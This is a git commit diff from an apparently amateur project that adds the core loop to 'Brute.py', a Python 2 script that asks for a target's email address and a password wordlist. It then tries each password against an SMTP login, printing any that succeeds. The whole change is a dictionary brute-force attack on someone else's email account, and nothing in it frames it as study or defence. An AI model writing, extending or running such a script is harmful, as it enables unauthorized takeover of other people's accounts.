6489f53ae3a90d5ebe2098378b045f80ea5efcbc
kite <sujith216590@gmail.com>
2020-06-21 14:31:27 +0530

    created a basic structure

--- Brute.py
+++ Brute.py
@@ -7,4 +7,11 @@ user = raw_input("enter the targets email adress :")
 passwfile = raw_input("enter th password file name :")
 passwfile = open(passwfile, "r")
 
+for password in passwfile:
+	try:
+	     smtpserver.login(user, password)
 
+	     print "[+] password found: %s" % password
+             break
+        except smtplib.SMTPAuthenticationError:
+	     print " [!] password incorrect: %s" % password
